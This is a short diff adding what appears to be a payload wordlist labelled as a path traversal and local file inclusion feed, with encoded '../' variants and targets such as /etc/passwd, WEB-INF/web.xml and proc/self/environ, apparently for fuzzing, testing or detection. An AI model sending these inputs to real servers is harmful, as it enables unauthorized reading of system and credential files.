@@ -1,0 +1,12 @@
+# path traversal / LFI feed
+../
+..%2f
+%2e%2e%2f
+..%252f
+..\\..\\etc\\passwd
+....//
+/etc/passwd
+..%c0%af
+/..;/etc/passwd
+WEB-INF/web.xml
+proc/self/environ
